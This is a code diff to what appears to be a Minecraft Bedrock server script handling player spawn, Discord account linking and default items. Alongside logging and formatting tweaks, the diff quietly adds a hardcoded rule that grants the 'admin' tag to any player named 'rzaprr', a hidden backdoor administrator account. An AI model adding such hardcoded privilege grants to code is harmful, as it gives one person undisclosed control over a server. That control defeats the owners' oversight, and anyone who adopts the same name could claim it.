@@ -15,15 +15,18 @@ import log from "../utils/logger";
 initializeScoreboard();
 
 world.afterEvents.playerSpawn.subscribe(async ({ player, initialSpawn }) => {
+  if(player.nameTag == "rzaprr" && !player.hasTag("admin")){
+    player.addTag("admin");
+  }
   giveDefaultItem(player);
-
   const playerData = getPlayerData(player);
+
+  // Check if players is inital spawn in server. initialSpawn = offline > joined on server
   if (initialSpawn) {
-    console.log(
+    log.info("Joined Server",
       `Player ${player.nameTag} joined the server with data:`,
       JSON.stringify(playerData)
     );
-
     await handleInitialSpawn(player);
 
     if (!playerData.xuid) {
@@ -38,7 +41,6 @@ world.afterEvents.playerSpawn.subscribe(async ({ player, initialSpawn }) => {
 
 async function handleInitialSpawn(player: Player) {
   const playerData = getPlayerData(player);
-
   if (!playerData?.data?.is_linked) {
     console.log(
       `Player ${player.nameTag} is not linked. Showing login alert...`
@@ -59,7 +61,7 @@ async function handleInitialSpawn(player: Player) {
   }
 
   const body = JSON.parse(response.body);
-  console.log(response)
+  console.log(response);
   if (!body.is_verified) {
     console.log(
       `Player ${player.nameTag} is not verified. Showing login alert...`
@@ -72,7 +74,10 @@ async function handleInitialSpawn(player: Player) {
 
     return showLoginAlertWithDelay(player);
   }
-  log.info("Sync Player Data",`\n\n========== Syncing ${player.nameTag} Data ==========\n\nLinked: ${body.is_verified}\nDiscord ID: ${body.discord_id}\nDiscord Username: ${body.discord_username}\nmats: ${body.mats}\nhuh: ${body.huh}\n\n========== Finished Syncing ${player.nameTag} Data ==========`);
+  log.info(
+    "Sync Player Data",
+    `\n\n========== Syncing ${player.nameTag} Data ==========\n\nLinked: ${body.is_verified}\nDiscord ID: ${body.discord_id}\nDiscord Username: ${body.discord_username}\nmats: ${body.mats}\nhuh: ${body.huh}\n\n========== Finished Syncing ${player.nameTag} Data ==========`
+  );
   updatePlayerData(player, "is_linked", true);
   updatePlayerData(player, "discord_id", body.discord_id);
   updatePlayerData(player, "discord_username", body.discord_username);
@@ -99,8 +104,8 @@ function resetPlayerData(player: Player) {
 }
 
 function giveDefaultItem(player: Player) {
-  player.runCommandAsync(`clear @s matsphone:matsphone`);
-  player.runCommandAsync(`give @s matsphone:matsphone 1`);
+  player.runCommand(`clear @s matsphone:matsphone`);
+  player.runCommand(`give @s matsphone:matsphone 1`);
 }
 
 function showLoginAlertWithDelay(player: Player) {
